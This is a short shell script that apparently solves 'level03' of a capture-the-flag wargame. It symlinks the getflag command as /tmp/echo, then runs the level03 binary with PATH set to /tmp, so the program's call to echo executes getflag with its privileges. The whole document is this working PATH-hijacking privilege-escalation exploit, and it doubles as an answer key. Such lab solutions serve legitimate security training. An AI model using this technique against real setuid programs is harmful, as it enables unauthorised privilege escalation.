#!/bin/sh -eu

# Create a symbolic link named `echo` that points to the `getflag` command
ln -s $(which getflag) /tmp/echo

# Execute the `level03` file with an altered `PATH` environment variable
env -i PATH=/tmp ~/level03

exit 0
